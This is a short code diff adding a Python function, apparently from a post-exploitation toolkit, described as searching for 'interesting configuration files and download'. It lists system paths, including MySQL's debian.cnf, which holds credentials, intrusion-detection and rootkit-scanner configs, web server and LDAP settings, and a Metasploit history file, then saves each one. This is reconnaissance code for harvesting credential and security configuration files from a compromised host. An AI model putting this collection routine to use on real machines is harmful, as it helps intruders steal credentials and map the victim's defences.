@@ -1,0 +1,16 @@
+
+'''
+@description: search for interesting configuration files and download
+@author: ohdae [bindshell@live.com]
+'''
+
+def get_configs():
+
+    configs = [ "/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf",
+                "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf", "/etc/nginx/nginx.conf",
+                "/etc/shells", "/etc/inetd.conf", "/etc/psad/psad.conf", "/etc/chkrootkit.conf", "/etc/rkhunter.conf",
+                "/etc/samba/smb.conf", "/etc/logrotate.conf", "~/.msf4/history", "/etc/ldap/ldap.conf", "/etc/openldap/ldap.conf",
+                "/etc/mysql/debian.cnf", "/etc/security/sepermit.conf", "/etc/gated.conf" ]
+
+    for x in configs:
+        save_file(x)
